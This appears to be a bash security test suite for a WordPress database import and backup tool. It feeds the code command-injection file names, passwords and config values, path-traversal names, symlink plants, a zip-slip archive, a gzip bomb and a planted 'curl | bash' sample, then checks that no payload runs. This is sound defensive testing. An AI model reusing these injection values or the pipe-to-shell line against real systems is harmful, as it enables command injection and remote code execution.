#!/usr/bin/env bash

# ================================================================
# Import Security Tests (penetration-style)
# ================================================================
#
# Description:
#   Attacks the import, backup, compressed-dump and download code with hostile input
#   and checks that nothing escapes:
#     - Command injection via file names, passwords, config values, DB names
#     - Path traversal (backup names, zip entries) and symlink/temp-file attacks
#     - Secret leakage (password on the command line, file permissions)
#     - Tampered / truncated / oversized input (download checksum, gzip bomb, huge lines)
#     - Static checks (no eval, no remote shell pipes, shellcheck errors)
#   A canary file is used as the injection target: if any payload runs, it appears.
#
# Usage:
#   ./lib/tests/unit/test_import_security.sh      (also: ./run_tests.sh security)
#
# ================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../test_framework.sh"

# File mode in octal on GNU and BSD stat (GNU first: on GNU stat, -f means "filesystem")
_file_mode() { stat -c %a "$1" 2>/dev/null || stat -f %Lp "$1"; }

_SEC_ROOT="$PROJECT_ROOT_DIR"
_SEC_WORK=""

_sec_load() {
    source "$_SEC_ROOT/lib/core/utils.sh" >/dev/null 2>&1
    source "$_SEC_ROOT/lib/database/sql_source.sh" >/dev/null 2>&1
    source "$_SEC_ROOT/lib/database/db_import.sh" >/dev/null 2>&1
    source "$_SEC_ROOT/lib/database/db_backup.sh" >/dev/null 2>&1
    source "$_SEC_ROOT/lib/utilities/stage_file_proxy.sh" >/dev/null 2>&1
}

_sec_work() {
    # Created once by the run function (never inside $(...), which would lose the variable)
    printf "%s" "$_SEC_WORK"
}

_chk() {
    local desc="$1"; shift
    if "$@" >/dev/null 2>&1; then
        printf "  ✅ %s\n" "$desc"
    else
        printf "  ❌ %s\n" "$desc"
        ((errors++))
    fi
}

_finish() {
    if [[ "$errors" -eq 0 ]]; then pass_test "$1"; else fail_test "$errors check(s) failed"; fi
}

_sec_stub() {
    cat > "$1/mysql" <<'EOF'
#!/usr/bin/env bash
{ printf 'ARGS:'; printf ' [%s]' "$@"; printf '\n'; } >> "$STUB_LOG"
printf '%s' "${MYSQL_PWD-}" > "$STUB_PWD_FILE"
cat > "${STUB_STDIN:-/dev/null}"
exit 0
EOF
    chmod +x "$1/mysql"
}

# ================================================================
# Command injection through file names
# ================================================================
test_sec_filename_injection() {
    start_test "Injection: File Names" "hostile SQL/backup file names never execute commands"
    _sec_load
    local errors=0 w; w=$(_sec_work)
    local canary="$w/CANARY"; rm -f "$canary"
    _sec_stub "$w"
    export WPDB_MYSQL_BIN="$w/mysql" STUB_LOG="$w/log" STUB_PWD_FILE="$w/pwd" STUB_STDIN="$w/stdin"

    # Payloads use a relative path, so run from $w: a canary appears there if any payload runs
    cd "$w" || return 1
    local names=(
        'evil $(touch CANARY).sql'
        'evil `touch CANARY`.sql'
        'evil;touch CANARY;.sql'
        'evil|touch CANARY.sql'
        'evil&&touch CANARY.sql'
        "it's \"quoted\".sql"
        '-leading-dash.sql'
        'spaces and (parens) [brackets] {braces}.sql'
        'tab	and*glob?.sql'
    )
    local n f ran=0
    for n in "${names[@]}"; do
        f="$w/$n"
        if ! printf "CREATE TABLE t (i int);\nINSERT INTO t VALUES (1);\n" > "$f" 2>/dev/null; then
            printf "  ❌ could not create test file named: %s\n" "$n"; ((errors++)); continue
        fi
        ran=$((ran + 1))
        : > "$STUB_STDIN"
        sql_verify_source "$f" >/dev/null 2>&1 || { printf "  ❌ verify rejected a valid file named: %s\n" "$n"; ((errors++)); }
        sql_open_stream "$f" >/dev/null 2>&1
        sql_uncompressed_size_bytes "$f" >/dev/null 2>&1
        : > "$STUB_LOG"
        perform_db_import_via_socket "$f" "$w/imp.log" "" "h" "u" "p" "d" "true" "true" >/dev/null 2>&1
        if [[ -e "$canary" ]]; then
            printf "  ❌ payload executed for file name: %s\n" "$n"; ((errors++)); rm -f "$canary"
        fi
        if ! grep -q 'INSERT INTO t' "$STUB_STDIN" 2>/dev/null; then
            printf "  ❌ file with odd name was not streamed correctly: %s\n" "$n"; ((errors++))
        fi
        rm -f "$f"
    done
    _chk "all ${#names[@]} hostile names were actually exercised" test "$ran" -eq "${#names[@]}"

    # Same for compressed names, and for a name that is only an option-looking string
    f="$w/gz \$(touch CANARY).sql.gz"
    printf "SELECT 1;\n" | gzip -c > "$f"
    _chk "compressed hostile file was created"   test -f "$f"
    sql_verify_source "$f" >/dev/null 2>&1; sql_open_stream "$f" >/dev/null 2>&1
    _chk "compressed hostile name does not execute" test ! -e "$canary"
    f="$w/-n"; printf "SELECT 1;\n" > "$f"
    _chk "option-like name '-n' is read as a file"  bash -c "cd '$w' && source '$_SEC_ROOT/lib/database/sql_source.sh' >/dev/null 2>&1; sql_open_stream ./-n | grep -q 'SELECT 1'"
    cd "$_SEC_ROOT" || true
    unset WPDB_MYSQL_BIN STUB_LOG STUB_PWD_FILE STUB_STDIN
    _finish "no file name reaches a shell"
}

# ================================================================
# Secrets: passwords with metacharacters, no leakage
# ================================================================
test_sec_password_handling() {
    start_test "Secrets: Passwords" "any password reaches mysql intact via MYSQL_PWD and never via argv"
    _sec_load
    local errors=0 w; w=$(_sec_work)
    _sec_stub "$w"
    export WPDB_MYSQL_BIN="$w/mysql" STUB_LOG="$w/log" STUB_PWD_FILE="$w/pwd" STUB_STDIN="$w/stdin"
    printf "SELECT 1;\n" > "$w/p.sql"

    local pw
    for pw in "p'a\"s\$s;\`id\`&|<>" " leading and trailing " "\\\\back\\slash" "日本語パス" '$(touch '"$w"'/PWNED)' "-p secret --host=evil"; do
        : > "$STUB_LOG"
        perform_db_import_via_socket "$w/p.sql" "$w/imp.log" "" "localhost" "user" "$pw" "db" "false" "false" >/dev/null 2>&1
        if [[ "$(cat "$STUB_PWD_FILE")" != "$pw" ]]; then
            printf "  ❌ password altered in transit: [%s]\n" "$pw"; ((errors++))
        fi
        if grep -qF -- "$pw" "$STUB_LOG"; then
            printf "  ❌ password visible in mysql arguments: [%s]\n" "$pw"; ((errors++))
        fi
    done
    _chk "no password payload executed"            test ! -e "$w/PWNED"
    _chk "argv has only expected option names"     bash -c "! grep -E -- '\[--host=evil\]|\[-p' '$STUB_LOG'"

    # Hostile host/port values cannot add options
    : > "$STUB_LOG"
    perform_db_import_via_socket "$w/p.sql" "$w/imp.log" "" "h --user=root;id:3306" "u" "p" "d" "false" "false" >/dev/null 2>&1
    _chk "host value stays a single argument"      bash -c "grep -c '^ARGS:' '$STUB_LOG' | grep -q 1 && ! grep -q '\] \[--user=root' '$STUB_LOG'"
    unset WPDB_MYSQL_BIN STUB_LOG STUB_PWD_FILE STUB_STDIN
    _finish "passwords are handled safely"
}

# ================================================================
# Backup: injection, traversal, permissions
# ================================================================
test_sec_backup() {
    start_test "Backup Hardening" "hostile backup_dir and DB name stay inside the backup folder"
    _sec_load
    local errors=0 w; w=$(_sec_work)
    local canary="$w/CANARY2"; rm -f "$canary"
    local home="$w/home"; mkdir -p "$home"
    local old_home="$HOME"; export HOME="$home"
    export CONFIG_AUTO_PROCEED=true     # unattended: never wait on the backup prompt
    execute_wp_cli() {
        case "$1 $2" in
            "db tables") echo wp_posts ;;
            "db export") echo "-- dump" ;;
        esac
        return 0
    }
    local dbname
    for dbname in "x;touch $canary;" "../../../../tmp/escape" '$(touch '"$canary"')' "a b/c\\d" ""; do
        get_wp_db_credentials() { WP_DB_NAME="$dbname"; export WP_DB_NAME; return 0; }
        local bdir="$w/bk-$RANDOM"
        CONFIG_BACKUP_DIR="$bdir" backup_database_before_import "$w" >/dev/null 2>&1
        local count; count=$(find "$bdir" -type f -name '*.sql.gz' 2>/dev/null | wc -l | tr -d ' ')
        if [[ "$count" != "1" ]]; then
            printf "  ❌ expected exactly 1 backup inside backup_dir for DB name [%s], found %s\n" "$dbname" "$count"; ((errors++))
        fi
        if find "$w" "$home" /tmp -maxdepth 1 -name 'escape*' 2>/dev/null | grep -q .; then
            printf "  ❌ path traversal escaped backup_dir for DB name [%s]\n" "$dbname"; ((errors++))
            rm -rf /tmp/escape*
        fi
    done
    _chk "DB-name payloads never executed"          test ! -e "$canary"
    printf "  ✅ 5 hostile DB names stayed inside backup_dir\n"

    # Hostile backup_dir values are literal directory names
    unset -f get_wp_db_credentials
    get_wp_db_credentials() { WP_DB_NAME="db"; export WP_DB_NAME; return 0; }
    local d
    for d in "$w/dir \$(touch $canary)" "$w/dir;touch $canary" "$w/dir\`touch $canary\`"; do
        CONFIG_BACKUP_DIR="$d" backup_database_before_import "$w" >/dev/null 2>&1
    done
    _chk "backup_dir payloads never executed"       test ! -e "$canary"

    # Permissions of default location
    CONFIG_BACKUP_DIR="" backup_database_before_import "$w" >/dev/null 2>&1
    local f; f=$(find "$home/.wp-db-import" -name '*.sql.gz' | head -1)
    _chk "backup file is owner-only (600)"          test "$(_file_mode "$f")" = "600"
    _chk "backup dir is owner-only (700)"           test "$(_file_mode "$home/.wp-db-import/backups")" = "700"
    _chk "parent ~/.wp-db-import is owner-only"     test "$(_file_mode "$home/.wp-db-import")" = "700"

    # umask must not widen permissions
    ( umask 000; CONFIG_BACKUP_DIR="$w/umask-bk" backup_database_before_import "$w" >/dev/null 2>&1
      test "$(_file_mode "$(ls "$w"/umask-bk/*.sql.gz | head -1)")" = "600" )
    _chk "permissive umask still yields 600 backups" test $? -eq 0

    unset -f execute_wp_cli get_wp_db_credentials
    unset CONFIG_AUTO_PROCEED
    export HOME="$old_home"
    _finish "backup cannot be abused"
}

# ================================================================
# Config values never executed
# ================================================================
test_sec_config_injection() {
    start_test "Injection: Config Values" "hostile values in wpdb-import.conf are data, never code"
    _sec_load
    source "$_SEC_ROOT/lib/config/config_manager.sh" >/dev/null 2>&1
    source "$_SEC_ROOT/lib/config/config_reader.sh" >/dev/null 2>&1
    source "$_SEC_ROOT/lib/config/integration.sh" >/dev/null 2>&1
    local errors=0 w; w=$(_sec_work)
    local canary="$w/CANARY3"; rm -f "$canary"
    cat > "$w/evil.conf" <<EOF
[general]
sql_file=\$(touch $canary).sql
old_domain=a.com\`touch $canary\`
new_domain=a.test;touch $canary
backup_before_import=\$(touch $canary)
backup_dir=\$(touch $canary)
use_socket=\`touch $canary\`
mysql_socket=;touch $canary
import_optimizations=\$(touch $canary)
parallel_import=\`touch $canary\`
[site_mappings]
EOF
    load_import_config "$w/evil.conf" >/dev/null 2>&1
    ensure_socket_config_settings "$w/evil.conf" >/dev/null 2>&1
    _chk "loading hostile config executes nothing"  test ! -e "$canary"
    _chk "values are kept as literal text"          grep -qF 'backup_dir=$(touch' "$w/evil.conf"
    _chk "hostile backup flag is not treated as false (fails safe)" test "$CONFIG_BACKUP_BEFORE_IMPORT" != false

    # Using the hostile values in importer/backup paths
    execute_wp_cli() { case "$1 $2" in "db tables") echo t;; "db export") echo x;; esac; }
    CONFIG_AUTO_PROCEED=true CONFIG_BACKUP_BEFORE_IMPORT="\$(touch $canary)" CONFIG_BACKUP_DIR="$w/hbk" backup_database_before_import "$w" >/dev/null 2>&1 </dev/null
    _chk "backup with hostile flag value executes nothing" test ! -e "$canary"
    # Hostile text typed at the backup prompt is just an answer
    printf '[general]\nbackup_before_import=ask\n[site_mappings]\n' > "$w/ans.conf"
    CONFIG_AUTO_PROCEED="" CONFIG_BACKUP_BEFORE_IMPORT=ask backup_database_before_import "$w" "$w/ans.conf" >/dev/null 2>&1 <<< "\$(touch $canary); touch $canary"
    _chk "hostile prompt answer executes nothing"     test ! -e "$canary"
    unset -f execute_wp_cli
    _finish "configuration is never evaluated"
}

# ================================================================
# Temp files and symlink attacks
# ================================================================
test_sec_tempfiles() {
    start_test "Temp File Attacks" "predictable-path, symlink and permission attacks fail"
    _sec_load
    local errors=0 w; w=$(_sec_work)
    local base="$w/tmp"; mkdir -p "$base"

    # Pre-planted symlink at the old predictable names must not be followed
    local victim="$w/VICTIM"; echo "keep me" > "$victim"
    ln -s "$victim" "$base/wp_db_import_$$.log"
    ln -s "$victim" "$base/wp_replace_1_$$.log"
    local d; d=$(TMPDIR="$base" secure_tmpdir)
    TMPDIR="$base" create_temp_file "wp_import" "log" >/dev/null
    : > "$d/db_import.log"
    _chk "victim file untouched by predictable-name symlinks" test "$(cat "$victim")" = "keep me"

    # Attacker pre-creates the directory name as a symlink: refused
    TMPDIR="$base" secure_tmpdir_cleanup
    ln -s "$w" "$base/wpdb-import-$(id -u)-$$"
    _symlink_refused() { ( export TMPDIR="$base"; ! secure_tmpdir >/dev/null 2>&1 ); }
    _chk "symlinked temp directory is refused"      _symlink_refused
    _chk "cleanup does not follow the symlink"      bash -c "TMPDIR='$base'; source '$_SEC_ROOT/lib/core/utils.sh' >/dev/null 2>&1; secure_tmpdir_cleanup; test -d '$w'"
    rm -f "$base/wpdb-import-$(id -u)-$$"

    # Pre-existing directory with loose permissions is tightened
    mkdir -m 777 "$base/wpdb-import-$(id -u)-$$"
    d=$(TMPDIR="$base" secure_tmpdir)
    _chk "loose pre-existing directory is tightened to 700" test "$(_file_mode "$d")" = "700"
    rm -rf "$d"

    # create_temp_file is owner-only and inside the private directory
    local f; f=$(TMPDIR="$base" create_temp_file "pen" "log")
    _chk "temp file mode is 600"                    test "$(_file_mode "$f")" = "600"
    _chk "temp file lives in the private directory" bash -c "[[ '$f' == '$base'/wpdb-import-* ]]"
    TMPDIR="$base" secure_tmpdir_cleanup

    # Hostile TMPDIR values
    local weird="$w/we ird \$(touch $w/CANARY4)'q"; mkdir -p "$weird"
    d=$(TMPDIR="$weird" secure_tmpdir)
    _chk "TMPDIR with spaces/quotes/\$() works safely" test -d "$d"
    _chk "TMPDIR payload not executed"              test ! -e "$w/CANARY4"
    TMPDIR="$weird" secure_tmpdir_cleanup
    _chk "missing TMPDIR is rejected cleanly"       bash -c "! TMPDIR='$w/nope/nope' bash -c 'source \"$_SEC_ROOT/lib/core/utils.sh\" >/dev/null 2>&1; secure_tmpdir' >/dev/null 2>&1"
    _finish "temp file attacks are blocked"
}

# ================================================================
# Hostile archives and oversized input
# ================================================================
test_sec_archives() {
    start_test "Hostile Archives" "zip-slip, gzip bombs and huge lines are handled without escape or hang"
    _sec_load
    local errors=0 w; w=$(_sec_work)

    # Zip-slip: entry names that try to leave the extraction directory. We never extract.
    mkdir -p "$w/slip/sandbox"
    python3 - "$w/slip/evil.zip" <<'PY'
import sys, zipfile
z = zipfile.ZipFile(sys.argv[1], "w")
z.writestr("../../ESCAPED.sql", "INSERT INTO t VALUES ('slip');\n")
z.writestr("/abs/ESCAPED2.sql", "INSERT INTO t VALUES ('abs');\n")
z.close()
PY
    ( cd "$w/slip/sandbox" && sql_open_stream "$w/slip/evil.zip" > "$w/slip/out.sql" 2>/dev/null )
    _chk "zip-slip entries are streamed, not extracted" bash -c "! find '$w' /tmp -maxdepth 3 -name 'ESCAPED*.sql' 2>/dev/null | grep -q ."
    _chk "payload is only on stdout"                grep -q "VALUES ('slip')" "$w/slip/out.sql"
    _chk "no files written next to the archive"     bash -c "test \$(ls '$w/slip' | wc -l | tr -d ' ') -eq 3"

    # Gzip bomb: 300 MB of zeros compresses tiny; streaming must not write it to disk
    head -c 314572800 /dev/zero | gzip -9 > "$w/bomb.sql.gz"
    local before after
    before=$(du -sk "$w" | awk '{print $1}')
    local t0 t1; t0=$(date +%s)
    sql_open_stream "$w/bomb.sql.gz" 2>/dev/null | head -c 100 >/dev/null
    t1=$(date +%s)
    after=$(du -sk "$w" | awk '{print $1}')
    _chk "bomb stream is consumed lazily (no disk expansion)" test $((after - before)) -lt 2048
    _chk "early-closing consumer does not hang"     test $((t1 - t0)) -lt 5
    _chk "uncompressed size is reported (not trusted as ok)" bash -c "[[ \$(source '$_SEC_ROOT/lib/database/sql_source.sh' >/dev/null 2>&1; sql_uncompressed_size_bytes '$w/bomb.sql.gz') -ge 314572800 ]]"
    rm -f "$w/bomb.sql.gz"

    # Huge DDL-shaped line through the filter: linear time, no catastrophic backtracking
    { printf '/*!40101 '; head -c 50000000 /dev/zero | tr '\0' 'a'; printf ' utf8mb4_0900_ai_ci */;\n'; } > "$w/hugeline.sql"
    t0=$(date +%s)
    sql_compat_filter < "$w/hugeline.sql" > "$w/huge.out" 2>/dev/null
    t1=$(date +%s)
    _chk "50 MB DDL-shaped line filtered in < 20s"  test $((t1 - t0)) -lt 20
    _chk "rewrite still applied on the huge line"   grep -q 'utf8mb4_unicode_520_ci' "$w/huge.out"
    rm -f "$w/hugeline.sql" "$w/huge.out"

    # Binary data must pass through the filter bit-for-bit on INSERT lines
    python3 - "$w/bin.sql" <<'PY'
import sys
data = b"INSERT INTO t VALUES (0x" + b"00ff80fe" * 1000 + b"),('\x00\xff\xfe\x80 utf8mb4_0900_ai_ci');\n"
open(sys.argv[1], "wb").write(data)
PY
    _chk "binary INSERT data passes unchanged"      cmp -s <(sql_compat_filter < "$w/bin.sql") "$w/bin.sql"
    _finish "hostile archives are contained"
}

# ================================================================
# Download tampering
# ================================================================
test_sec_download_tampering() {
    start_test "Download Tampering" "modified, truncated or swapped plugin zips are rejected"
    _sec_load
    local errors=0 w; w=$(_sec_work)
    printf 'legit-plugin-zip-content-0123456789' > "$w/good.zip"
    local good; good=$(sha256_of_file "$w/good.zip")
    export SFP_RELEASE_SHA256="$good"

    SFP_RELEASE_URL="file://$w/good.zip" download_verified_stage_file_proxy_zip "$w/o1.zip" /dev/null
    _chk "untampered file accepted"                 test $? -eq 0

    printf 'legit-plugin-zip-content-012345678X' > "$w/flip.zip"
    SFP_RELEASE_URL="file://$w/flip.zip" download_verified_stage_file_proxy_zip "$w/o2.zip" /dev/null >/dev/null 2>&1
    _chk "one flipped byte is rejected"             test $? -ne 0
    _chk "rejected file is removed"                 test ! -e "$w/o2.zip"

    head -c 10 "$w/good.zip" > "$w/trunc.zip"
    SFP_RELEASE_URL="file://$w/trunc.zip" download_verified_stage_file_proxy_zip "$w/o3.zip" /dev/null >/dev/null 2>&1
    _chk "truncated file is rejected"               test $? -ne 0

    printf '' > "$w/empty.zip"
    SFP_RELEASE_URL="file://$w/empty.zip" download_verified_stage_file_proxy_zip "$w/o4.zip" /dev/null >/dev/null 2>&1
    _chk "empty file is rejected"                   test $? -ne 0

    # Partial-hash / case tricks must not pass
    local prefix="${good:0:32}"
    SFP_RELEASE_SHA256="$prefix" SFP_RELEASE_URL="file://$w/good.zip" download_verified_stage_file_proxy_zip "$w/o5.zip" /dev/null >/dev/null 2>&1
    _chk "partial hash (prefix) is rejected"        test $? -ne 0
    SFP_RELEASE_SHA256="$(printf '%s' "$good" | tr 'a-f' 'A-F')" SFP_RELEASE_URL="file://$w/good.zip" download_verified_stage_file_proxy_zip "$w/o6.zip" /dev/null >/dev/null 2>&1
    _chk "non-canonical (uppercase) hash is rejected, never loosely matched" test $? -ne 0

    # If hashing is impossible the download must be refused, not trusted
    sha256_of_file() { return 1; }
    SFP_RELEASE_SHA256="$good" SFP_RELEASE_URL="file://$w/good.zip" download_verified_stage_file_proxy_zip "$w/o7.zip" /dev/null >/dev/null 2>&1
    _chk "no SHA-256 tool -> download refused"      test $? -ne 0
    _chk "unverified file is removed"               test ! -e "$w/o7.zip"
    unset -f sha256_of_file; _sec_load

    # The shipped pin matches the committed constant and URL scheme is https
    _chk "shipped release URL is https"             bash -c "grep -E '^SFP_RELEASE_URL=' '$_SEC_ROOT/lib/utilities/stage_file_proxy.sh' | grep -q 'https://github.com/manishsongirkar/'"
    _chk "download uses curl --fail (HTTP errors are failures)" grep -q 'curl -fsSL' "$_SEC_ROOT/lib/utilities/stage_file_proxy.sh"
    unset SFP_RELEASE_SHA256
    _finish "tampered downloads are never installed"
}

# ================================================================
# Static checks
# ================================================================
test_sec_static() {
    start_test "Static Security Scan" "no eval/remote-exec/world-writable/credential patterns; shellcheck clean"
    _sec_load
    local errors=0 w; w=$(_sec_work)
    local files=(
        "$_SEC_ROOT/lib/database/sql_source.sh"
        "$_SEC_ROOT/lib/database/db_backup.sh"
        "$_SEC_ROOT/lib/database/db_import.sh"
    )
    local all=( "$_SEC_ROOT/import_wp_db.sh" "$_SEC_ROOT"/lib/*/*.sh "$_SEC_ROOT"/lib/*.sh )

    _has_eval()      { grep -nE '(^|[^a-zA-Z_])eval[[:space:]]' "$@"; }
    _has_pipe_sh()   { grep -nE '(curl|wget)[^|#]*\|[[:space:]]*(ba)?sh' "$@"; }
    _has_chmod_wide(){ grep -nE 'chmod[[:space:]]+(-R[[:space:]]+)?(777|666|o\+w|a\+w)' "$@"; }
    _has_pw_argv()   { grep -nE -- '--password=|[[:space:]]-p"?\$' "$@"; }
    _has_hardcoded() { grep -niE "(password|passwd|secret)=[\"'][^\"'\$]+[\"']" "$@"; }

    # Negative controls: each detector must fire on a planted bad sample
    cat > "$w/bad.sh" <<'EOF'
eval "$x"
curl -s http://x | bash
chmod 777 /tmp/x
mysql -pSecret db
mysql --password=abc db
DB_PASSWORD="hunter2"
EOF
    _chk "control: eval detector works"          _has_eval "$w/bad.sh"
    _chk "control: pipe-to-shell detector works" _has_pipe_sh "$w/bad.sh"
    _chk "control: chmod detector works"         _has_chmod_wide "$w/bad.sh"
    _chk "control: password-argv detector works" _has_pw_argv "$w/bad.sh"
    _chk "control: hardcoded-cred detector works" _has_hardcoded "$w/bad.sh"

    _no() { ! "$@"; }
    _chk "no eval in the new import/backup code"        _no _has_eval "${files[@]}"
    _chk "no pipe-to-shell downloads anywhere"          _no _has_pipe_sh "${all[@]}"
    _chk "no world-writable chmod anywhere"             _no _has_chmod_wide "${all[@]}"
    _chk "password only via MYSQL_PWD (new code)"       _no _has_pw_argv "${files[@]}"
    _chk "no hardcoded credentials (new code)"          _no _has_hardcoded "${files[@]}"
    if command -v shellcheck >/dev/null 2>&1; then
        _chk "shellcheck: no errors in new modules"     shellcheck -S error -s bash "${files[@]}"
    else
        printf "  ⚠️  shellcheck not installed; skipped\n"
    fi
    _finish "static scan clean"
}

run_import_security_tests() {
    printf "\n${CYAN}${BOLD}🛡️  Import Security Tests (penetration-style)${RESET}\n"
    printf "%s\n\n" "$(printf '=%.0s' {1..50})"

    init_test_session "import_security"
    _SEC_WORK=$(mktemp -d "${TMPDIR:-/tmp}/wpdb-sec-test.XXXXXX")
    trap 'secure_tmpdir_cleanup 2>/dev/null; rm -rf "$_SEC_WORK"' EXIT

    test_sec_filename_injection
    test_sec_password_handling
    test_sec_backup
    test_sec_config_injection
    test_sec_tempfiles
    test_sec_archives
    test_sec_download_tampering
    test_sec_static

    [[ -n "$_SEC_WORK" ]] && rm -rf "$_SEC_WORK"
    finalize_test_session
    return $?
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    run_import_security_tests
fi
